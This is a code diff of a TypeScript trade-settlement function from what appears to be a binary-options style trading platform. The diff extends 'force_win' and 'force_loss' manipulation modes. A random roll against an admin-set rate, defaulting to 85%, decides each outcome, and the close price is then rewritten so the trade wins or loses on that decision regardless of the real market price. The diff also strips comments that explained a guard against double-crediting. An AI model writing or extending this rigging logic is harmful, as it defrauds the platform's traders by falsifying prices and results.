@@ -13,31 +13,63 @@ export async function settleExpiredTrades(userId?: string) {
       user: {
         select: {
           manipulation: true,
+          winRate: true,
         },
       },
     },
   });
+
+  if (openTrades.length === 0) return;
+
+  const marketSetting = await prisma.marketSetting.findUnique({
+    where: { id: "default" },
+  });
+  const defaultForceWinRate = marketSetting?.forceWinRate ?? 85.0;
+  const defaultForceLossRate = marketSetting?.forceLossRate ?? 85.0;
 
   for (const trade of openTrades) {
     const originalClosePrice = await getPrice(trade.assetId);
     let closePrice = originalClosePrice;
     let won = false;
 
-    const userManipulation = trade.user?.manipulation ?? "normal";
+    const userManipulation = trade.user?.manipulation ?? marketSetting?.manipulation ?? "normal";
+    const userWinRate = trade.user?.winRate;
 
     if (userManipulation === "force_win") {
-      won = true;
-      if (trade.direction === "up") {
-        closePrice = Math.max(originalClosePrice, trade.openPrice + 0.05);
+      const winProbability = userWinRate !== null && userWinRate !== undefined ? userWinRate : defaultForceWinRate;
+      const roll = Math.random() * 100;
+      if (roll <= winProbability) {
+        won = true;
+        if (trade.direction === "up") {
+          closePrice = Math.max(originalClosePrice, trade.openPrice + 0.05);
+        } else {
+          closePrice = Math.min(originalClosePrice, trade.openPrice - 0.05);
+        }
       } else {
-        closePrice = Math.min(originalClosePrice, trade.openPrice - 0.05);
+        won = false;
+        if (trade.direction === "up") {
+          closePrice = Math.min(originalClosePrice, trade.openPrice - 0.05);
+        } else {
+          closePrice = Math.max(originalClosePrice, trade.openPrice + 0.05);
+        }
       }
     } else if (userManipulation === "force_loss") {
-      won = false;
-      if (trade.direction === "up") {
-        closePrice = Math.min(originalClosePrice, trade.openPrice - 0.05);
+      const lossProbability = userWinRate !== null && userWinRate !== undefined ? userWinRate : defaultForceLossRate;
+      const roll = Math.random() * 100;
+      if (roll <= lossProbability) {
+        won = false;
+        if (trade.direction === "up") {
+          closePrice = Math.min(originalClosePrice, trade.openPrice - 0.05);
+        } else {
+          closePrice = Math.max(originalClosePrice, trade.openPrice + 0.05);
+        }
       } else {
-        closePrice = Math.max(originalClosePrice, trade.openPrice + 0.05);
+        won = true;
+        if (trade.direction === "up") {
+          closePrice = Math.max(originalClosePrice, trade.openPrice + 0.05);
+        } else {
+          closePrice = Math.min(originalClosePrice, trade.openPrice - 0.05);
+        }
       }
     } else {
       won =
@@ -48,17 +80,6 @@ export async function settleExpiredTrades(userId?: string) {
 
     const profit = won ? trade.stake * (trade.payout / 100) : -trade.stake;
 
-    // Claim this trade atomically before doing anything else. updateMany
-    // with `status: "open"` in the WHERE clause means only the first caller
-    // to reach this line actually updates a row — if another request
-    // (e.g. a second browser tab/device polling the same account) already
-    // settled this same trade a moment earlier, count will be 0 here and we
-    // skip it entirely. Without this guard, two overlapping calls to
-    // settleExpiredTrades (easy to trigger with multiple tabs open, since
-    // syncFromApi() polls on every price tick) could both see the trade as
-    // still "open", both proceed, and on a win both credit the payout —
-    // double-crediting a single win, which is what was actually happening
-    // here, not a sign error in the profit math itself.
     const claim = await prisma.trade.updateMany({
       where: { id: trade.id, status: "open" },
       data: {
@@ -70,8 +91,6 @@ export async function settleExpiredTrades(userId?: string) {
     });
 
     if (claim.count === 0) {
-      // Another concurrent call already claimed and settled this trade.
-      // Don't touch balance — that already happened (exactly once) there.
       continue;
     }
 
